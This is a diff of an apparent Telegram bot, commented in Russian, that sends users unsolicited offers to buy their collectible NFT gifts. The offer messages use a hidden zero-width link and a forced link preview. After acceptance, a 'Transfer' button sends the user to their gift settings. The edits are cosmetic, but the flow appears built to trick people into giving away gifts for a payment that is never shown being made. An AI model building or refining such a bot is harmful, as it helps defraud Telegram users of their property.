@@ -17,7 +17,7 @@ last_message_id = None
 STAR_EMOJI_ID = "5323333018151045958"
 CHECK_EMOJI_ID = "5774022692642492953"
 CROSS_EMOJI_ID = "5778527486270770928"
-ENVELOPE_EMOJI_ID = "6019263620142078168" # <--- Твой ID конверта
+ENVELOPE_EMOJI_ID = "6019263620142078168"
 
 STAR_EMOJI = f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐</tg-emoji>'
 
@@ -85,6 +85,7 @@ async def send_offer(message: Message):
     nft_link = f'<a href="{link}">{nft_name}</a>'
     hidden_link = f'<a href="{link}">&#8203;</a>'
 
+    # ТЕКСТ КАК БЫЛ (ничего не менял)
     if lang == "ru":
         offer_text = (
             f"<b>{sender_name} предлагает Вам {amount} {currency_display} за коллекционный предмет {nft_link}.</b>\n\n"
@@ -98,7 +99,7 @@ async def send_offer(message: Message):
             f"{hidden_link}"
         )
 
-    # Кнопки с премиум-иконками
+    # КНОПКИ (только добавил эмодзи)
     keyboard = InlineKeyboardMarkup(inline_keyboard=[[
         InlineKeyboardButton(
             text="Отклонить" if lang == "ru" else "Decline", 
@@ -131,8 +132,9 @@ async def send_offer(message: Message):
             text=offer_text,
             reply_markup=keyboard,
             business_connection_id=message.business_connection_id,
+            # ПРИНУДИТЕЛЬНО УКАЗЫВАЕМ NFT ДЛЯ ПРЕВЬЮ
             link_preview_options=LinkPreviewOptions(
-                url=link,
+                url=link, 
                 is_disabled=False,
                 prefer_large_media=True,
                 show_above_text=True
@@ -178,12 +180,12 @@ async def on_accept_offer(callback: CallbackQuery):
         btn_transfer = "Transfer"
         btn_how = "How to transfer?"
 
-    # Кнопка "Передать" с иконкой конверта
+    # Кнопка "Передать" с конвертом
     new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(
             text=btn_transfer, 
             url="tg://settings/my-profile/gifts",
-            icon_custom_emoji_id=ENVELOPE_EMOJI_ID # <--- Иконка конверта
+            icon_custom_emoji_id=ENVELOPE_EMOJI_ID
         )],
         [InlineKeyboardButton(text=btn_how, callback_data="send_transfer")]
     ])
